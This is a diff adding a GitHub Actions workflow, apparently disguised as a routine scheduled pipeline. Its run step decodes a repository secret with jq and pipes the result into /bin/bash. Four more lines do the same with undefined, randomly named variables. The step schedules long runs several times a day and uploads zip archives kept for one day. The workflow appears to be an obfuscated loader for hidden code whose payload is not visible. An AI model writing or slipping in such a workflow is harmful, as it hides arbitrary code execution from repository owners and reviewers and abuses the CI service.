@@ -1,0 +1,37 @@
+name: Pipeline
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '58 2,8,14,20 * * *'
+permissions:
+  contents: read
+  actions: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  service:
+    name: Run task
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+      - name: Run
+        env:
+          awu6: ${{ secrets.awu6 }}
+        run: |
+          printf '%s' "$awu6" | jq -r .g5 | /bin/bash
+          printf '%s' "$ws19" | jq -r .cgryk2 | /bin/bash
+          echo $kyuhu0328 | jq -r .yabw4423 | /bin/bash
+          echo $hzp721 | jq -r .kl593 | /bin/bash
+          echo $llymh4 | jq -r .sye0 | /bin/bash
+
+      - name: Save archive
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: wHGateua
+          path: "*.zip"
+          retention-days: 1
